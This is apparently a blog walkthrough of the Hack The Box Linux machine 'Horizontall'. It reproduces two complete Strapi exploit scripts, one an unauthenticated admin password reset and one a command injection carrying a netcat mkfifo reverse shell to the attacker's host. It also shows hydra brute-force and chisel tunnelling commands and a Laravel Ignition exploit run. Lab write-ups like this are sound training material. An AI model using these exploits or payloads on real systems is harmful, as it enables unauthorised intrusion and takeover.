---
title: "Horizontall"
author: "Me"
date: "December 31, 2021"
output: html_document
---

# Horizontall

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: Easy (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_hor_desc.png){: height="300px" width = 320px"}
</div>

**Ports/services exploited:** 80/http\\
**Tools:** AutoRecon, wfuzz, dirb, hydra, chisel\\
**Techniques:** enumeration, port forwarding\\
**Keywords:** Strapi CMS, CVE-2019-18818, CVE-2019-19609, laravel

**TL;DR**: There's a web server running on the host, but the web page is completely unresponsive. Having nothing to do there, we quickly find a subdomain which uses Strapi, an open-source CMS used for building fast and easily manageable APIs. The version of Strapi (3.8.8) is vulnerable to RCE, and there are existing exploits for this vulnerability, giving us a basic reverse shell. Looking at the processes and ports, we see something on port 8000. By using chisel for port forwarding, we discover it's running laravel (a web application framework) V8, which is in turn vulnerable to RCE. There is also an existing exploit that allows us to read files with root permissions on the target.


## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

I've read a lot about an enumeration tool called **AutoRecon**, so I will give it a try on this box. All the installation steps are described in the Github repo (<https://github.com/Tib3rius/AutoRecon>) and won't be covered here. The author says that *Autorecon* works by firstly performing port scans / service detection scans. From those initial results, the tool will launch further enumeration scans of those services using a number of different tools. For example, if HTTP is found, feroxbuster will be launched (as well as many others). There are various possible parameters, but I'll try here with the "basic" syntax:

````
sudo autorecon 10.10.11.105
`````

Below is a copied/pasted explanation of the results:

*By default, results will be stored in the ./results directory. A new sub directory is created for every target. The structure of this sub directory is:*

````
.
├── exploit/
├── loot/
├── report/
│   ├── local.txt
│   ├── notes.txt
│   ├── proof.txt
│   └── screenshots/
└── scans/
	├── _commands.log
	├── _manual_commands.txt
	└── xml/
``````

*The exploit directory is intended to contain any exploit code you download / write for the target.*

*The loot directory is intended to contain any loot (e.g. hashes, interesting files) you find on the target.*

*The report directory contains some auto-generated files and directories that are useful for reporting:*

*local.txt can be used to store the local.txt flag found on targets.
notes.txt should contain a basic template where you can write notes for each service discovered.
proof.txt can be used to store the proof.txt flag found on targets.
The screenshots directory is intended to contain the screenshots you use to document the exploitation of the target.
The scans directory is where all results from scans performed by AutoRecon will go. This includes port scans / service detection scans, as well as any service enumeration scans. It also contains two other files:*

*_commands.log contains a list of every command AutoRecon ran against the target. This is useful if one of the commands fails and you want to run it again with modifications.
_manual_commands.txt contains any commands that are deemed "too dangerous" to run automatically, either because they are too intrusive, require modification based on human analysis, or just work better when there is a human monitoring them.*

Note that the scan took **48 minutes** to run. Despite the length (which can most likely be reduced with parameters), it is interesting because it creates a directory structure that encourages one to have a certain methodology. This can be especially useful if we have to write a report afterwards.

Let's look at the results in the */results/10.10.11.105* directory. We'll start by looking at the *scans* results:

<div class="img_container">
![scans]({{https://jsom1.github.io/}}/_images/htb_hor_scans.png)
</div>

We see Autorecon performed a full TCP scan as well as a quick one, and also a top 100 udp ports scan. Because ports 22 and 80 are open, it created directories containing additional information about them. Let's look at *nmap's* output:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_hor_nmap.png)
</div>

Note that we see exactly what *nmap* command the tool used. Finally, we see there's SSH on port 22 and a web server on port 80. Even though I like seeing web servers, they have a very large attack surface and it's not always easy to find a vulnerability...

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

Before visiting the web page, let's look into the */tcp80* directory. It's awesome, the folder contains results of directories bruteforce with different wordlists, and another *nmap* scan specifically for port 80.\\
This latter many http scripts and shows that it didn't find any CSRF vulnerabilities, could't determine the underlying framework or CMS, didn't find any DOM-based or stored XSS, and so on... Even though it didn't find anything we can use, it's still very useful to have this information so that we don't have to do these checks manually ourselves.

We saw in the *nmap* result that there was a redirect to *horizontall.htb*, so let's add it to our */etc/hosts* file and browse to it to see this website.

````
sudo echo "10.10.11.105 horizontall.htb" >> /etc/hosts
``````

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_hor_site.png)
</div>

The page has many buttons, but nothing happens when we click on them. We see a bunch of *JavaScript* scipts when inspecting the page. At the bottom of it, there's a "Contact us" form. I tried sending something and intercept the request with *Burp*, but nothing happens when we click on *Send*.\\
Something *nmap* didn't say is wether it found any subdomain or not. Let's try this manually with the following command:

````
sudo wfuzz -c -f res.tst -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 301 -u http://horinzontall.htb/ -H "Host:FUZZ.horizontall.htb"
`````

<div class="img_container">
![wfuzz]({{https://jsom1.github.io/}}/_images/htb_hor_wfuzz.png)
</div>

Finally we have something! I first tried with the *top1million-5000.txt* and *top1million-20000.txt* wordlists, but that wasn't enough. The parameter *--hc 301* is used because we don't want to see *301* requests - that would spam the terminal. So, let's have a look at that subdomain:

<div class="img_container">
![site 2]({{https://jsom1.github.io/}}/_images/htb_hor_site2.png)
</div>

There's only this "Welcome" message. We don't see it in the picture, but the browser's tab says "Welcome to your API". Let's use *dirb* once again to enumerate this new domain:

````
sudo dirb http://api-prod.horizontall.htb
`````

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_hor_dirb.png)
</div>

There are a few directories, and */admin* looks promising. Let's look at it:

<div class="img_container">
![admin]({{https://jsom1.github.io/}}/_images/htb_hor_admin.png)
</div>

From a quick Google search, *"Strapi is an open-source headless CMS used for building fast and easily manageable APIs written in JavaScript"*. 
The first thing to do is obviously to try credentials such as *admin/admin* - it doesn't work. We could potentially try to bruteforce the credentials, but let's keep that option as a last resort. Let's see if it could be vulnerable to SQL injections by inputting the following string in the username and/or password fields:

````
admin' or 1=1;#
`````

It doesn't seem to be the case. By searching for "Strapi exploits" on the web, we see a few exploits and among them, we see that strapi version 3.0.0 or lower is vulnerable to RCE. That would be great, but we don't know the version yet. I tried getting this information by inspecting the page to see if we could find anything about it, but it doesn't seem to be the case. Before switching to another directory discovered by *dirb*, we can try to bruteforce the login with *hydra*. We have low chances of success, but it's worth a try.\\
In */results/10.10.11.105/scans*, there's a file called *_manual_commands.txt*. This file was generated by *Autorecon* and contains commands that require user modification or validation. There, we find hydra's syntax for bruteforcing a login on a web server:

`````
hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/results/10.10.11.105/scans/tcp80/tcp_80_http_form_hydra.txt" http-post-form://10.10.11.105/path/to/login.php:username=^USER^&password=^PASS^:invalid-login-message
``````
This commands uses 2 wordlists by default, but we can of course use the ones we like. We indeed see that we have to adapt this command. I tried with the following syntax:

````
sudo hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top10000.txt" -e nsr -s 80 -o "/home/kali/results/10.10.11.105/scans/tcp80/tcp_80_http_form_hydra.txt" "http-post-form://api-prod.horizontall.htb/admin/auth/login:identifier=^
USER^&password=^PASS^:Identifier or password invalid."
`````

The replacements for *username* and *password* can be found by inspecting the page after submitting a login attempt. In this case, we see the POST request in the *Console* tab. We then click on the request, and then on *Params*.\\
Because I used the *top10000* wordlist, it was taking a lot of time and I interrupted it. Of course, we could try with different wordlists, but there's probably another more elegant way in!

Before looking at the RCE exploit (we still don't know the version), let's look at the */reviews* directory revealed by *dirb*:

<div class="img_container">
![reviews]({{https://jsom1.github.io/}}/_images/htb_hor_reviews.png)
</div>

There are reviews from users, and we can see the raw data as well as the request's headers. I tried adding a review by sending a POST request using *Burp*, but it generates an error I couldn't resolve:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_hor_burp.png)
</div>

If that would have worked, we could maybe have included a payload in the *data* that would have been executed when the browser renders the reviews (XSS). Since it's not the case, we'll finally have a look at that exploit we saw earlier. There are 2 exploit-DB versions, one for authenticated users, and one for unauthenticated users. The code of the latter is the following:

````
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys

if len(sys.argv) != 2:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Remember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
``````

We see the exploit first determines the version by making a GET request to */admin/init*. We can do the check manually and finally get the version!

<div class="img_container">
![strapi version]({{https://jsom1.github.io/}}/_images/htb_hor_version.png)
</div>

I realize it could have been a good idea to perform an additional *dirb* scan on */admin*. This way we would have found the version if a few seconds. After determining the version, the script changes the password and retrieve the Json web token (*jwt*) from the request. It then uses it to install a plugin on the admin panel.\\
The exploit's descriptions is the following: *"The Strapi framework prior to 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin components of the Admin panel, because it does not sanitize the plugin name, and attackers can inject arbitrary shell commands to be executed by the execa function"*.\\
I don't see the *execa* function in the script, but let's try the exploit and see what happens. We can get the exploit from exploit-DB by clicking on "View raw", copying it and pasting it in a new file (sudo nano *name.py*) on Kali. I named it *strapiexploit.py* and placed it in */results/10.10.11.105/exploit*. Let's try it:

<div class="img_container">
![exploit]({{https://jsom1.github.io/}}/_images/htb_hor_exploit.png)
</div>

We see it works and gives us a kind of prompt. I tried here to issue *whoami*, but we get a message indicating it's a blind RCE and that there's no output. We have to find the intended syntax to execute code. Note that we also got credentials and should now be able to access the admin panel (use *admin@horizontall.htb/SuperStrongPassword1* on */admin*). We land on the following page:

<div class="img_container">
![admin panel]({{https://jsom1.github.io/}}/_images/htb_hor_dashboard.png)
</div>

There's a file upload possibility, and maybe it's possible to upload a reverse shell payload on execute it? Before exploring this lead however, let's see if we can get the previous exploit to work. I found a Github repo (https://github.com/diego-tella/CVE-2019-19609-EXPLOIT) containing an exploit for this vulnerability. The code is the following:

````
#!/bin/python
import requests
import argparse

parser = argparse.ArgumentParser(description='Exploit for CVE-2019-16609 in Strapi')
parser.add_argument('-d', '--domain', type=str, help='Target IP or domain', required=True)
parser.add_argument('-jwt', '--jwtoken', type=str, help='Json web token authenticate', required=True)
parser.add_argument('-l', '--lhost', type=str, help='Your host', required=True)
parser.add_argument('-p', '--port', type=int, help='Port your machine is listening on', required=True)
args = parser.parse_args()

url = args.domain
port = args.port
jwt = args.jwtoken
host = args.lhost
urlVuln = "http://"+url + "/admin/plugins/install"

print("[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)")
print("[+] Remember to start listening to the port "+str(port)+" to get a reverse shell") 

headers = {'Host': url, 'Authorization': 'Bearer '+jwt, 'Content-Type': 'application/json', 'Content-Length': '131', 'Connection': 'close'}

#feel free to modify the payload
data = '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+host+' '+str(port)+' >/tmp/f)", "port":"80"}' #Depending on the scenario, you will have to change the port here

print("[+] Sending payload... Check if you got shell")

r = requests.post(urlVuln, headers=headers, data=data, verify=False)

print("[+] Payload sent. Response:")
print(r)
print(r.text)
``````

We see the payload is a netcat reverse shell, so that could do the work! We have to give 4 parameters to the script: the domain, the Json web token (jwt), the local host and a port. Note that the previous exploit gave us our jwt: mine is *eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxMjEzNTI5LCJleHAiOjE2NDM4M\\
DU1Mjl9.jeVXS_lQg1st2cVd7qC4axDulCR8gFyb0FdNOH-mFyM*. So, let's download this script into */results/10.10.11.105/exploit* and try it:

````
sudo git clone https://github.com/diego-tella/CVE-2019-19609-EXPLOIT
`````
Then, the syntax is *python exploit.py -d DOMAIN_OR_IP -jwt JSON_WEB_TOKEN -l LHOST -p LPORT*. In our case, that is:

````
sudo python exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxMjEzNTI5LCJleHAiOjE2NDM4MDU1Mjl9.jeVXS_lQg1st2cVd7qC4axDulCR8gFyb0FdNOH-mFyM -l 10.10.14.9 -p 4444
`````

Before running the exploit, we set up a netcat listener in another terminal window:

````
sudo nc -nlvp 4444
`````

And we see the exploit worked:

<div class="img_container">
![revsh]({{https://jsom1.github.io/}}/_images/htb_hor_revsh.png)
</div>

Note that we first have a simple reverse shell, so we can use the following command to use python to upgrade it into a fully interactive tty

````
python -c 'import pty;pty.spawn("/bin/bash");'
`````

The first thing I did was to check the users and see if we can already get the flag or if we will have to go through horizontal privesc. It turns out it's not the case:

<div class="img_container">
![user flag]({{https://jsom1.github.io/}}/_images/htb_hor_user.png)
</div>

And that's it for the user!

## 3. Vertical privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

Let's look around manually and see if we can find anything interesting. There has to be a database running locally, and we can confirm that with:

````
netstat -antp
````

We see the port 3306 is listening, and this is a MySQL instance. Even though we don't have credentials, we can try a few obvious combinations:

````
mysql -u admin -p
`````

I tried with a few different usernames and passwords, to no avail... We have to find something else. I wanted to SSH in using the current user's ssh key, but for some reason we're not allowed to *cd* into */.ssh*. Looking at *netstat -antp* output, we see there is also something listening on port 8000. We can't access it from Kali, but we can *curl* the page from strapi:

````
curl 127.0.0.1:8000
`````

The output is lengthy and messy, but there are a lot of references to laravel (*"Laravel is a web application framework with expressive, elegant syntax"*). In the last box I did (<a href="/_walkthroughs/Devzat">Devzat</a>), I used a tool for the first time called *chisel* to access a database that was running in a container on the compromised host. For the sake of the exercise, let's try to use it again here to display the page in our own browser.\\
First, we have to upload *chisel* on the compromised host. To do so, we start a python web server on Kali (*sudo python -m SimpleHTTPServer* in the directory in which we have *chisel*), and *wget* (*wget http://10.10.14.9:8000/chisel*) it from *strapi*. On *strapi*, I created a *.tmp* directory in */tmp* to download it. Finally, we make it executable with *chmod +x chisel*.

Then, we run the following command on Kali:

````
sudo ./chisel server -p 6004 --reverse &
`````
and the following one on *strapi*:

````
./chisel client 10.10.14.9:6004 R:6001:127.0.0.1:8000
``````

Note that the syntax for the last command is *./chisel client [kali_IP]:[kali_port] R:[port_to_listen_connection]:127.0.0.1:[port_to_forward]*. So, we redirect everything on port 8000 on the target onto port 6001 on Kali. If everything works fine, we should be able to see the page content in our browser on Kali:

<div class="img_container">
![web page]({{https://jsom1.github.io/}}/_images/htb_hor_laravel.png)
</div>

I find it awesome and way easier to read than the output we got by using *wget*. In a glance, we see Laravel v8. There are a few results with *searchsploit*, but the version isn't mentionned. Let's look on the internet instead. By searching "laravel v8 exploit", we see a lot of results and RCEs. I read somewhere that "*If Laravel is in debugging mode you will be able to access the code and sensitive data. For example http://127.0.0.1:8000/profiles*".\\
We can try in our browser, and indeed it seems to be in debugging mode:

<div class="img_container">
![debug]({{https://jsom1.github.io/}}/_images/htb_hor_debug.png)
</div>

Furthermore, it is said that this is usually needed for exploiting other Laravel RCE CVEs. We learn that the error page in the debugging mode is handled by Ignition, and that this latter in version <= 2.5.1 is vulnerable. There are a few existing exploits, let's try https://github.com/nth347/CVE-2021-3129_exploit. We start by cloning it and making it executable, and then we use it with the syntax given in the article:

```
sudo git clone https://github.com/nth347/CVE-2021-3129_exploit.git
cd CVE-2021-3129_exploit/
sudo chmod +x exploit.py
sudo ./exploit.py http://127.0.0.1:6001 Monolog/RCE1 "whoami"
`````

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_hor_root.png)
</div>

Note that I immediately tried to read the root flag, and it worked. At this point we could probably get a reverse shell or read the SSH keys, but I've spent a lot of time on this box and I am satisfied being able to read the flag!

<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_hor_pwn.png){: height="380px" width = 390px"}
</div>


<ins>**My thoughts**</ins>

First of all, I found that even though this box is rated as easy, it's not that easy. It's probably rated so because we're "only" using CVEs without modifications, but compared to <a href="/_walkthroughs/Blue">Blue</a> or <a href="/_walkthroughs/Lame">Lame</a> for example, it's much more difficult.\\
I didn't particularly like this box because I don't feel like I learned a lot in terms of technical skills. Instead, I learned about *strapi* and *laravel* (that can still be useful). However, it was a good opportunity to train port forwarding and use *chisel* once again. Also, it was nice to use *autorecon* and see a different, more structured approach than I usually have.

I didn't explore the file upload functionality on the admin panel, so there might be other ways to do it. I spent too much time on this box and I'm already looking forward to the next one, so I won't explore this possibility!

<ins>**Fix the vulnerabilities**</ins>

There's not much to say here, I think simply upgrading *strapi* and *laravel* would make that box secure. 
